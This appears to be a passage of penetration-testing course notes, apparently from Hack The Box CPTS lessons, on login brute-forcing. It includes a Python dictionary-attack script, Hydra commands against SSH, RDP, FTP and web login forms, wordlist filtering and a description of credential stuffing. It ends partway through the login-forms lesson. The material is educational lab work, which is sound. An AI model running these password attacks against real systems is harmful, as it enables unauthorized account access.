    "excerpt": "While comprehensive, the brute-force approach can be time-consuming and resource-intensive, especially when dealing with complex passwords. That's where dictionary attacks come in. The Power of Words ...",
    "category": "02_CPTS",
    "content": "\n\nWhile comprehensive, the brute-force approach can be time-consuming and resource-intensive, especially when dealing with complex passwords. That's where dictionary attacks come in.\n\n## The Power of Words\n\nThe effectiveness of a dictionary attack lies in its ability to exploit the human tendency to prioritize memorable passwords over secure ones. Despite repeated warnings, many individuals continue to opt for passwords based on readily available information such as dictionary words, common phrases, names, or easily guessable patterns. This predictability makes them vulnerable to dictionary attacks, where attackers systematically test a pre-defined list of potential passwords against the target system.\n\nThe success of a dictionary attack hinges on the quality and specificity of the wordlist used. A well-crafted wordlist tailored to the target audience or system can significantly increase the probability of a successful breach. For instance, if the target is a system frequented by gamers, a wordlist enriched with gaming-related terminology and jargon would prove more effective than a generic dictionary. The more closely the wordlist reflects the likely password choices of the target, the higher the chances of a successful attack.\n\nAt its core, the concept of a dictionary attack is rooted in understanding human psychology and common password practices. By leveraging this insight, attackers can efficiently crack passwords that might otherwise necessitate an impractically lengthy brute-force attack. In this context, the power of words resides in their ability to exploit human predictability and compromise otherwise robust security measures.\n\n## Brute Force vs. Dictionary Attack\n\nThe fundamental distinction between a brute-force and a dictionary attack lies in their methodology for generating potential password candidates:\n\n- `Brute Force`: A pure brute-force attack systematically tests _every possible combination_ of characters within a predetermined set and length. While this approach guarantees eventual success given enough time, it can be extremely time-consuming, particularly against longer or complex passwords.\n- `Dictionary Attack`: In stark contrast, a dictionary attack employs a pre-compiled list of words and phrases, dramatically reducing the search space. This targeted methodology results in a far more efficient and rapid attack, especially when the target password is suspected to be a common word or phrase.\n\n|Feature|Dictionary Attack|Brute Force Attack|Explanation|\n|---|---|---|---|\n|`Efficiency`|Considerably faster and more resource-efficient.|Can be extremely time-consuming and resource-intensive.|Dictionary attacks leverage a pre-defined list, significantly narrowing the search space compared to brute-force.|\n|`Targeting`|Highly adaptable and can be tailored to specific targets or systems.|No inherent targeting capability.|Wordlists can incorporate information relevant to the target (e.g., company name, employee names), increasing the success rate.|\n|`Effectiveness`|Exceptionally effective against weak or commonly used passwords.|Effective against all passwords given sufficient time and resources.|If the target password is within the dictionary, it will be swiftly discovered. Brute force, while universally applicable, can be impractical for complex passwords due to the sheer volume of combinations.|\n|`Limitations`|Ineffective against complex, randomly generated passwords.|Often impractical for lengthy or highly complex passwords.|A truly random password is unlikely to appear in any dictionary, rendering this attack futile. The astronomical number of possible combinations for lengthy passwords can make brute-force attacks infeasible.|\n\nConsider a hypothetical scenario where an attacker targets a company's employee login portal. The attacker might construct a specialized wordlist that incorporates the following:\n\n- Commonly used, weak passwords (e.g., \"password123,\" \"qwerty\")\n- The company name and variations thereof\n- Names of employees or departments\n- Industry-specific jargon\n\nBy deploying this targeted wordlist in a dictionary attack, the attacker significantly elevates their likelihood of successfully cracking employee passwords compared to a purely random brute-force endeavor.\n\n## Building and Utilizing Wordlists\n\nWordlists can be obtained from various sources, including:\n\n- `Publicly Available Lists`: The internet hosts a plethora of freely accessible wordlists, encompassing collections of commonly used passwords, leaked credentials from data breaches, and other potentially valuable data. Repositories like [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) offer various wordlists catering to various attack scenarios.\n- `Custom-Built Lists`: Penetration testers can craft their wordlists by leveraging information gleaned during the reconnaissance phase. This might include details about the target's interests, hobbies, personal information, or any other data for password creation.\n- `Specialized Lists`: Wordlists can be further refined to target specific industries, applications, or even individual companies. These specialized lists increase the likelihood of success by focusing on passwords that are more likely to be used within a particular context.\n- `Pre-existing Lists`: Certain tools and frameworks come pre-packaged with commonly used wordlists. For instance, penetration testing distributions like ParrotSec often include wordlists like `rockyou.txt`, a massive collection of leaked passwords, readily available for use.\n\nHere is a table of some of the more useful wordlists for login brute-forcing:\n\n|Wordlist|Description|Typical Use|Source|\n|---|---|---|---|\n|`rockyou.txt`|A popular password wordlist containing millions of passwords leaked from the RockYou breach.|Commonly used for password brute force attacks.|[RockYou breach dataset](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)|\n|`top-usernames-shortlist.txt`|A concise list of the most common usernames.|Suitable for quick brute force username attempts.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)|\n|`xato-net-10-million-usernames.txt`|A more extensive list of 10 million usernames.|Used for thorough username brute forcing.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)|\n|`2023-200_most_used_passwords.txt`|A list of the 200 most commonly used passwords as of 2023.|Effective for targeting commonly reused passwords.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)|\n|`Default-Credentials/default-passwords.txt`|A list of default usernames and passwords commonly used in routers, software, and other devices.|Ideal for trying default credentials.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt)|\n\n## Throwing a dictionary at the problem\n\n**To follow along, start the target system via the question section at the bottom of the page.**\n\nThe instance application creates a route (`/dictionary`) that handles POST requests. It expects a `password` parameter in the request's form data. Upon receiving a request, it compares the submitted password against the expected value. If there's a match, it responds with a JSON object containing a success message and the flag. Otherwise, it returns an error message with a 401 status code (Unauthorized).\n\nCopy and paste this Python script below as `dictionary-solver.py` onto your machine. You only need to modify the IP and port variables to match your target system information.\n\nCode: python\n\n```python\nimport requests\n\nip = \"127.0.0.1\"  # Change this to your instance IP address\nport = 1234       # Change this to your instance port number\n\n# Download a list of common passwords from the web and split it into lines\npasswords = requests.get(\"https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt\").text.splitlines()\n\n# Try each password from the list\nfor password in passwords:\n    print(f\"Attempted password: {password}\")\n\n    # Send a POST request to the server with the password\n    response = requests.post(f\"http://{ip}:{port}/dictionary\", data={'password': password})\n\n    # Check if the server responds with success and contains the 'flag'\n    if response.ok and 'flag' in response.json():\n        print(f\"Correct password found: {password}\")\n        print(f\"Flag: {response.json()['flag']}\")\n        break\n```\n\nThe Python script orchestrates the dictionary attack. It performs the following steps:\n\n1. `Downloads the Wordlist`: First, the script fetches a wordlist of 500 commonly used (and therefore weak) passwords from SecLists using the `requests` library.\n2. `Iterates and Submits Passwords`: It then iterates through each password in the downloaded wordlist. For each password, it sends a POST request to the Flask application's `/dictionary` endpoint, including the password in the request's form data.\n3. `Analyzes Responses`: The script checks the response status code after each request. If it's 200 (OK), it examines the response content further. If the response contains the \"flag\" key, it signifies a successful login. The script then prints the discovered password and the captured flag.\n4. `Continues or Terminates`: If the response doesn't indicate success, the script proceeds to the next password in the wordlist. This process continues until the correct password is found or the entire wordlist is exhausted.\n\nDictionary Attacks\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 dictionary-solver.py\n\n...\nAttempted password: turtle\nAttempted password: tiffany\nAttempted password: golf\nAttempted password: bear\nAttempted password: tiger\nCorrect password found: ...\nFlag: HTB{...}\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/15-login Bruteforce/06-Hybrid Attacks",
    "path": "02_CPTS/15-login Bruteforce/06-Hybrid Attacks.md",
    "title": "06 Hybrid Attacks",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Many organizations implement policies requiring users to change their passwords periodically to enhance security. However, these policies can inadvertently breed predictable password patterns if u...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nMany organizations implement policies requiring users to change their passwords periodically to enhance security. However, these policies can inadvertently breed predictable password patterns if users are not adequately educated on proper password hygiene.\n\n![Diagram showing original password 'Summer2023' modified to 'Summer2023!' and 'Summer2024'.](https://academy.hackthebox.com/storage/modules/57/2n.png)\n\nUnfortunately, a widespread and insecure practice among users is making minor modifications to their passwords when forced to change them. This often manifests as appending a number or a special character to the end of the current password. For instance, a user might have an initial password like \"Summer2023\" and then, when prompted to update it, change it to \"Summer2023!\" or \"Summer2024.\"\n\nThis predictable behavior creates a loophole that hybrid attacks can exploit ruthlessly. Attackers capitalize on this human tendency by employing sophisticated techniques that combine the strengths of dictionary and brute-force attacks, drastically increasing the likelihood of successful password breaches.\n\n### Hybrid Attacks in Action\n\nLet's illustrate this with a practical example. Consider an attacker targeting an organization known to enforce regular password changes.\n\n![Flowchart showing password attack process: target organization uses common passwords and industry terms; attacker performs reconnaissance, dictionary attack, and brute-force targeting user accounts.](https://academy.hackthebox.com/storage/modules/57/3n.png)\n\nThe attacker begins by launching a dictionary attack, using a wordlist curated with common passwords, industry-specific terms, and potentially personal information related to the organization or its employees. This phase attempts to quickly identify any low-hanging fruit - accounts protected by weak or easily guessable passwords.\n\nHowever, if the dictionary attack proves unsuccessful, the hybrid attack seamlessly transitions into a brute-force mode. Instead of randomly generating password combinations, it strategically modifies the words from the original wordlist, appending numbers, special characters, or even incrementing years, as in our \"Summer2023\" example.\n\nThis targeted brute-force approach drastically reduces the search space compared to a traditional brute-force attack while covering many potential password variations that users might employ to comply with the password change policy.\n\n### The Power of Hybrid Attacks\n\nThe effectiveness of hybrid attacks lies in their adaptability and efficiency. They leverage the strengths of both dictionary and brute-force techniques, maximizing the chances of cracking passwords, especially in scenarios where users fall into predictable patterns.\n\nIt's important to note that hybrid attacks are not limited to the password change scenario described above. They can be tailored to exploit any observed or suspected password patterns within a target organization. Let's consider a scenario where you have access to a common passwords wordlist, and you're targeting an organization with the following password policy:\n\n- Minimum length: 8 characters\n- Must include:\n    - At least one uppercase letter\n    - At least one lowercase letter\n    - At least one number\n\nTo extract only the passwords that adhere to this policy, we can leverage the powerful command-line tools available on most Linux/Unix-based systems by default, specifically `grep` paired with regex. We are going to use the [darkweb2017-top10000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt) password list for this. First, download the wordlist\n\nHybrid Attacks\n\n```shell-session\ndrxh3kr@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt\n```\n\nNext, we need to start matching that wordlist to the password policy.\n\nHybrid Attacks\n\n```shell-session\ndrxh3kr@htb[/htb]$ grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt\n```\n\nThis initial `grep` command targets the core policy requirement of a minimum password length of 8 characters. The regular expression `^.{8,}$` acts as a filter, ensuring that only passwords containing at least 8 characters are passed through and saved in a temporary file named `darkweb2017-minlength.txt`.\n\nHybrid Attacks\n\n```shell-session\ndrxh3kr@htb[/htb]$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt\n```\n\nBuilding upon the previous filter, this `grep` command enforces the policy's demand for at least one uppercase letter. The regular expression `[A-Z]` ensures that any password lacking an uppercase letter is discarded, further refining the list saved in `darkweb2017-uppercase.txt`.\n\nHybrid Attacks\n\n```shell-session\ndrxh3kr@htb[/htb]$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt\n```\n\nMaintaining the filtering chain, this `grep` command ensures compliance with the policy's requirement for at least one lowercase letter. The regular expression `[a-z]` serves as the filter, keeping only passwords that include at least one lowercase letter and storing them in `darkweb2017-lowercase.txt`.\n\nHybrid Attacks\n\n```shell-session\ndrxh3kr@htb[/htb]$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt\n```\n\nThis last `grep` command tackles the policy's numerical requirement. The regular expression `[0-9]` acts as a filter, ensuring that passwords containing at least one numerical digit are preserved in `darkweb2017-number.txt`.\n\nHybrid Attacks\n\n```shell-session\ndrxh3kr@htb[/htb]$ wc -l darkweb2017-number.txt\n\n89 darkweb2017-number.txt\n```\n\nAs demonstrated by the output above, meticulously filtering the extensive 10,000-password list against the password policy has dramatically narrowed down our potential passwords to 89. This drastic reduction in the search space represents a significant boost in efficiency for any subsequent password cracking attempts. A smaller, targeted list translates to a faster and more focused attack, optimizing the use of computational resources and increasing the likelihood of a successful breach.\n\n## Credential Stuffing: Leveraging Stolen Data for Unauthorized Access\n\n![Flowchart showing sources of credentials like data breaches and phishing, leading to attacker actions such as acquiring credentials and unauthorized access, resulting in data theft and identity fraud.](https://academy.hackthebox.com/storage/modules/57/5n.png)\n\nCredential stuffing attacks exploit the unfortunate reality that many users reuse passwords across multiple online accounts. This pervasive practice, often driven by the desire for convenience and the challenge of managing numerous unique credentials, creates a fertile ground for attackers to exploit.\n\nIt's a multi-stage process that begins with attackers acquiring lists of compromised usernames and passwords. These lists can stem from large-scale data breaches or be compiled through phishing scams and malware. Notably, publicly available wordlists like `rockyou` or those found in `seclists` can also serve as a starting point, offering attackers a trove of commonly used passwords.\n\nOnce armed with these credentials, attackers identify potential targets - online services likely used by the individuals whose information they possess. Social media, email providers, online banking, and e-commerce sites are prime targets due to the sensitive data they often hold.\n\nThe attack then shifts into an automated phase. Attackers use tools or scripts to systematically test the stolen credentials against the chosen targets, often mimicking normal user behavior to avoid detection. This allows them to rapidly test vast numbers of credentials, increasing their chances of finding a match.\n\nA successful match grants unauthorized access, opening the door to various malicious activities, from data theft and identity fraud to financial crimes. The compromised account may be a launchpad for further attacks, spreading malware, or infiltrating connected systems.\n\n### The Password Reuse Problem\n\nThe core issue fueling credential stuffing's success is the pervasive practice of password reuse. When users rely on the same or similar passwords for multiple accounts, a breach on one platform can have a domino effect, compromising numerous other accounts. This highlights the urgent need for strong, unique passwords for every online service, coupled with proactive security measures like multi-factor authentication.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/15-login Bruteforce/07-Hydra",
    "path": "02_CPTS/15-login Bruteforce/07-Hydra.md",
    "title": "07 Hydra",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Hydra is a fast network login cracker that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including web applications, remote login servic...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nHydra is a fast network login cracker that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including web applications, remote login services like SSH and FTP, and even databases.\n\nHydra's popularity stems from its:\n\n- `Speed and Efficiency`: Hydra utilizes parallel connections to perform multiple login attempts simultaneously, significantly speeding up the cracking process.\n- `Flexibility`: Hydra supports many protocols and services, making it adaptable to various attack scenarios.\n- `Ease of Use`: Hydra is relatively easy to use despite its power, with a straightforward command-line interface and clear syntax.\n\n### Installation\n\nHydra often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:\n\nHydra\n\n```shell-session\ndrxh3kr@htb[/htb]$ hydra -h\n```\n\nIf Hydra is not installed or you are using a different Linux distribution, you can install it from the package repository:\n\nHydra\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo apt-get -y update\ndrxh3kr@htb[/htb]$ sudo apt-get -y install hydra \n```\n\n## Basic Usage\n\nHydra's basic syntax is:\n\nHydra\n\n```shell-session\ndrxh3kr@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]\n```\n\n|Parameter|Explanation|Usage Example|\n|---|---|---|\n|`-l LOGIN` or `-L FILE`|Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`).|`hydra -l admin ...` or `hydra -L usernames.txt ...`|\n|`-p PASS` or `-P FILE`|Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`).|`hydra -p password123 ...` or `hydra -P passwords.txt ...`|\n|`-t TASKS`|Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.|`hydra -t 4 ...`|\n|`-f`|Fast mode: Stop the attack after the first successful login is found.|`hydra -f ...`|\n|`-s PORT`|Port: Specify a non-default port for the target service.|`hydra -s 2222 ...`|\n|`-v` or `-V`|Verbose output: Display detailed information about the attack's progress, including attempts and results.|`hydra -v ...` or `hydra -V ...` (for even more verbosity)|\n|`service://server`|Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname.|`hydra ssh://192.168.1.100`|\n|`/OPT`|Service-specific options: Provide any additional options required by the target service.|`hydra http-get://example.com/login.php -m \"POST:user=^USER^&pass=^PASS^\"` (for HTTP form-based authentication)|\n\n### Hydra Services\n\nHydra services essentially define the specific protocols or services that Hydra can target. They enable Hydra to interact with different authentication mechanisms used by various systems, applications, and network services. Each module is designed to understand a particular protocol's communication patterns and authentication requirements, allowing Hydra to send appropriate login requests and interpret the responses. Below is a table of commonly used services:\n\n|Hydra Service|Service/Protocol|Description|Example Command|\n|---|---|---|---|\n|ftp|File Transfer Protocol (FTP)|Used to brute-force login credentials for FTP services, commonly used to transfer files over a network.|`hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`|\n|ssh|Secure Shell (SSH)|Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.|`hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`|\n|http-get/post|HTTP Web Services|Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.|`hydra -l admin -P /path/to/password_list.txt http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\"`|\n|smtp|Simple Mail Transfer Protocol|Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.|`hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`|\n|pop3|Post Office Protocol (POP3)|Targets email retrieval services to brute-force credentials for POP3 login.|`hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`|\n|imap|Internet Message Access Protocol|Used to brute-force credentials for IMAP services, which allow users to access their email remotely.|`hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`|\n|mysql|MySQL Database|Attempts to brute-force login credentials for MySQL databases.|`hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`|\n|mssql|Microsoft SQL Server|Targets Microsoft SQL servers to brute-force database login credentials.|`hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`|\n|vnc|Virtual Network Computing (VNC)|Brute-forces VNC services, used for remote desktop access.|`hydra -P /path/to/password_list.txt vnc://192.168.1.100`|\n|rdp|Remote Desktop Protocol (RDP)|Targets Microsoft RDP services for remote login brute-forcing.|`hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`|\n\n### Brute-Forcing HTTP Authentication\n\nImagine you're tasked with testing the security of a website using basic HTTP authentication at `www.example.com`. You have a list of potential usernames stored in `usernames.txt` and corresponding passwords in `passwords.txt`. To launch a brute-force attack against this HTTP service, use the following Hydra command:\n\nHydra\n\n```shell-session\ndrxh3kr@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get\n```\n\nThis command instructs Hydra to:\n\n- Use the list of usernames from the `usernames.txt` file.\n- Use the list of passwords from the `passwords.txt` file.\n- Target the website `www.example.com`.\n- Employ the `http-get` module to test the HTTP authentication.\n\nHydra will systematically try each username-password combination against the target website to discover a valid login.\n\n### Targeting Multiple SSH Servers\n\nConsider a situation where you have identified several servers that may be vulnerable to SSH brute-force attacks. You compile their IP addresses into a file named `targets.txt` and know that these servers might use the default username \"root\" and password \"toor.\" To efficiently test all these servers simultaneously, use the following Hydra command:\n\nHydra\n\n```shell-session\ndrxh3kr@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh\n```\n\nThis command instructs Hydra to:\n\n- Use the username \"root\".\n- Use the password \"toor\".\n- Target all IP addresses listed in the `targets.txt` file.\n- Employ the `ssh` module for the attack.\n\nHydra will execute parallel brute-force attempts on each server, significantly speeding up the process.\n\n### Testing FTP Credentials on a Non-Standard Port\n\nImagine you need to assess the security of an FTP server hosted at `ftp.example.com`, which operates on a non-standard port `2121`. You have lists of potential usernames and passwords stored in `usernames.txt` and `passwords.txt`, respectively. To test these credentials against the FTP service, use the following Hydra command:\n\nHydra\n\n```shell-session\ndrxh3kr@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp\n```\n\nThis command instructs Hydra to:\n\n- Use the list of usernames from the `usernames.txt` file.\n- Use the list of passwords from the `passwords.txt` file.\n- Target the FTP service on `ftp.example.com` via port `2121`.\n- Use the `ftp` module and provide verbose output (`-V`) for detailed monitoring.\n\nHydra will attempt to match each username-password combination against the FTP server on the specified port.\n\n### Brute-Forcing a Web Login Form\n\nSuppose you are tasked with brute-forcing a login form on a web application at `www.example.com`. You know the username is \"admin,\" and the form parameters for the login are `user=^USER^&pass=^PASS^`. To perform this attack, use the following Hydra command:\n\nHydra\n\n```shell-session\ndrxh3kr@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form \"/login:user=^USER^&pass=^PASS^:S=302\"\n```\n\nThis command instructs Hydra to:\n\n- Use the username \"admin\".\n- Use the list of passwords from the `passwords.txt` file.\n- Target the login form at `/login` on `www.example.com`.\n- Employ the `http-post-form` module with the specified form parameters.\n- Look for a successful login indicated by the HTTP status code `302`.\n\nHydra will systematically attempt each password for the \"admin\" account, checking for the specified success condition.\n\n### Advanced RDP Brute-Forcing\n\nNow, imagine you're testing a Remote Desktop Protocol (RDP) service on a server with IP `192.168.1.100`. You suspect the username is \"administrator,\" and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers. To carry out this precise attack, use the following Hydra command:\n\nHydra\n\n```shell-session\ndrxh3kr@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp\n```\n\nThis command instructs Hydra to:\n\n- Use the username \"administrator\".\n- Generate and test passwords ranging from 6 to 8 characters, using the specified character set.\n- Target the RDP service on `192.168.1.100`.\n- Employ the `rdp` module for the attack.\n\nHydra will generate and test all possible password combinations within the specified parameters, attempting to break into the RDP service.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/15-login Bruteforce/08-Basic HTTP Authentication",
    "path": "02_CPTS/15-login Bruteforce/08-Basic HTTP Authentication.md",
    "title": "08 Basic HTTP Authentication",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Basic HTTP Authentication Web applications often employ authentication mechanisms to protect sensitive data and functionalities. Basic HTTP Authentication, or simply Basic Auth, is a rudimentary yet c...",
    "category": "02_CPTS",
    "content": "# Basic HTTP Authentication\n\nWeb applications often employ authentication mechanisms to protect sensitive data and functionalities. Basic HTTP Authentication, or simply `Basic Auth`, is a rudimentary yet common method for securing resources on the web. Though easy to implement, its inherent security vulnerabilities make it a frequent target for brute-force attacks.\n\nIn essence, Basic Auth is a challenge-response protocol where a web server demands user credentials before granting access to protected resources. The process begins when a user attempts to access a restricted area. The server responds with a `401 Unauthorized` status and a `WWW-Authenticate` header prompting the user's browser to present a login dialog.\n\nOnce the user provides their username and password, the browser concatenates them into a single string, separated by a colon. This string is then encoded using Base64 and included in the `Authorization` header of subsequent requests, following the format `Basic <encoded_credentials>`. The server decodes the credentials, verifies them against its database, and grants or denies access accordingly.\n\nFor example, the headers for Basic Auth in a HTTP GET request would look like:\n\nCode: http\n\n```http\nGET /protected_resource HTTP/1.1\nHost: www.example.com\nAuthorization: Basic YWxpY2U6c2VjcmV0MTIz\n```\n\n## Exploiting Basic Auth with Hydra\n\n**To follow along, start the target system via the question section at the bottom of the page.**\n\nWe will use the `http-get` hydra service to brute force the basic authentication target.\n\nIn this scenario, the spawned target instance employs Basic HTTP Authentication. We already know the username is `basic-auth-user`. Since we know the username, we can simplify the Hydra command and focus solely on brute-forcing the password. Here's the command we'll use:\n\nBasic HTTP Authentication\n\n```shell-session\n# Download wordlist if needed\ndrxh3kr@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt\n# Hydra command\ndrxh3kr@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81\n\n...\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task\n[DATA] attacking http-get://127.0.0.1:81/\n[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32\n```\n\nLet's break down the command:\n\n- `-l basic-auth-user`: This specifies that the username for the login attempt is 'basic-auth-user'.\n- `-P 2023-200_most_used_passwords.txt`: This indicates that Hydra should use the password list contained in the file '2023-200_most_used_passwords.txt' for its brute-force attack.\n- `127.0.0.1`: This is the target IP address, in this case, the local machine (localhost).\n- `http-get /`: This tells Hydra that the target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path ('/').\n- `-s 81`: This overrides the default port for the HTTP service and sets it to 81.\n\nUpon execution, Hydra will systematically attempt each password from the `2023-200_most_used_passwords.txt` file against the specified resource. Eventually it will return the correct password for `basic-auth-user`, which you can use to login to the website and retrieve the flag.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/15-login Bruteforce/09-Login Forms",
    "path": "02_CPTS/15-login Bruteforce/09-Login Forms.md",
    "title": "09 Login Forms",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Login Forms Beyond the realm of Basic HTTP Authentication, many web applications employ custom login forms as their primary authentication mechanism. These forms, while visually diverse, often share c...",
    "category": "02_CPTS",
    "content": "# Login Forms\n\nBeyond the realm of Basic HTTP Authentication, many web applications employ custom login forms as their primary authentication mechanism. These forms, while visually diverse, often share common underlying mechanics that make them targets for brute forcing.\n\n## Understanding Login Forms\n\nWhile login forms may appear as simple boxes soliciting your username and password, they represent a complex interplay of client-side and server-side technologies. At their core, login forms are essentially HTML forms embedded within a webpage. These forms typically include input fields (`<input>`) for capturing the username and password, along with a submit button (`<button>` or `<input type=\"submit\">`) to initiate the authentication process.\n\n## A Basic Login Form Example\n\nMost login forms follow a similar structure. Here's an example:\n\nCode: html\n\n```html\n<form action=\"/login\" method=\"post\">\n  <label for=\"username\">Username:</label>\n  <input type=\"text\" id=\"username\" name=\"username\"><br><br>\n  <label for=\"password\">Password:</label>\n  <input type=\"password\" id=\"password\" name=\"password\"><br><br>\n  <input type=\"submit\" value=\"Submit\">\n</form>\n```\n\nThis form, when submitted, sends a POST request to the `/login` endpoint on the server, including the entered username and password as form data.\n\nCode: http\n\n```http\nPOST /login HTTP/1.1\nHost: www.example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 29\n\nusername=john&password=secret123\n```\n\n- The `POST` method indicates that data is being sent to the server to create or update a resource.\n- `/login` is the URL endpoint handling the login request.\n- The `Content-Type` header specifies how the data is encoded in the request body.\n- The `Content-Length` header indicates the size of the data being sent.\n- The request body contains the username and password, encoded as key-value pairs.\n\nWhen a user interacts with a login form, their browser handles the initial processing. The browser captures the entered credentials, often employing JavaScript for client-side validation or input sanitization. Upon submission, the browser constructs an HTTP POST request. This request encapsulates the form data—including the username and password—within its body, often encoded as `application/x-www-form-urlencoded` or `multipart/form-data`.\n\n## http-post-form\n\n**To follow along, start the target system via the question section at the bottom of the page.**\n\nHydra's `http-post-form` service is specifically designed to target login forms. It enables the automation of POST requests, dynamically inserting username and password combinations into the request body. By leveraging Hydra's capabilities, attackers can efficiently test numerous credential combinations against a login form, potentially uncovering valid logins.\n\nThe general structure of a Hydra command using `http-post-form` looks like this:\n\nLogin Forms\n\n```shell-session\ndrxh3kr@htb[/htb]$ hydra [options] target http-post-form \"path:params:condition_string\"\n```\n\n### Understanding the Condition String\n\nIn Hydra’s `http-post-form` module, success and failure conditions are crucial for properly identifying valid and invalid login attempts. Hydra primarily relies on failure conditions (`F=...`) to determine when a login attempt has failed, but you can also specify a success condition (`S=...`) to indicate when a login is successful.\n\nThe failure condition (`F=...`) is used to check for a specific string in the server's response that signals a failed login attempt. This is the most common approach because many websites return an error message (like \"Invalid username or password\") when the login fails. For example, if a login form returns the message \"Invalid credentials\" on a failed attempt, you can configure Hydra like this:\n\nCode: bash\n\n```bash\nhydra ... http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid credentials\"\n```\n\nIn this case, Hydra will check each response for the string \"Invalid credentials.\" If it finds this phrase, it will mark the login attempt as a failure and move on to the next username/password pair. This approach is commonly used because failure messages are usually easy to identify.\n\nHowever, sometimes you may not have a clear failure message but instead have a distinct success condition. For instance, if the application redirects the user after a successful login (using HTTP status code `302`), or displays specific content (like \"Dashboard\" or \"Welcome\"), you can configure Hydra to look for that success condition using `S=`. Here’s an example where a successful login results in a 302 redirect:\n\nCode: bash\n\n```bash\nhydra ... http-post-form \"/login:user=^USER^&pass=^PASS^:S=302\"\n```\n\nIn this case, Hydra will treat any response that returns an HTTP 302 status code as a successful login. Similarly, if a successful login results in content like \"Dashboard\" appearing on the page, you can configure Hydra to look for that keyword as a success condition:\n\nCode: bash\n\n```bash\nhydra ... http-post-form \"/login:user=^USER^&pass=^PASS^:S=Dashboard\"\n```\n\nHydra will now register the login as successful if it finds the word \"Dashboard\" in the server’s response.\n\nBefore unleashing Hydra on a login form, it's essential to gather intelligence on its inner workings. This involves pinpointing the exact parameters the form uses to transmit the username and password to the server.\n\n### Manual Inspection\n\nUpon accessing the `IP:PORT` in your browser, a basic login form is presented. Using your browser's developer tools (typically by right-clicking and selecting \"Inspect\" or a similar option), you can view the underlying HTML code for this form. Let's break down its key components:\n\nCode: html\n\n```html\n<form method=\"POST\">\n    <h2>Login</h2>\n    <label for=\"username\">Username:</label>\n    <input type=\"text\" id=\"username\" name=\"username\">\n    <label for=\"password\">Password:</label>\n    <input type=\"password\" id=\"password\" name=\"password\">\n    <input type=\"submit\" value=\"Login\">\n</form>\n```\n\nThe HTML reveals a simple login form. Key points for Hydra:\n\n- `Method`: `POST` - Hydra will need to send POST requests to the server.\n- Fields:\n    - `Username`: The input field named `username` 